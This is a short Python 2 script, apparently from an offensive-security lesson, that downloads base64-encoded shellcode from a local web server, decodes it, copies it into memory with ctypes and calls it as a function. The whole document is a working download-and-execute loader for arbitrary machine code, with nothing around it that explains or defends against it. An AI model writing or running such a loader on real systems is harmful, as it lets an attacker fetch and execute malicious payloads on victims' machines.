import urllib2
import ctypes
import base64

# retrieve shellcode 
url = "http://localhost:8000/shellcode.bin"
response = urllib2.urlopen(url)

# decode the shellcode from base64
shellcode = base64.b64decode(response.read())

# create buffer in memory
shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))

# create function pointer to our shellcode
shellcode_func	= ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))

# call our shellcode
shellcode_func()
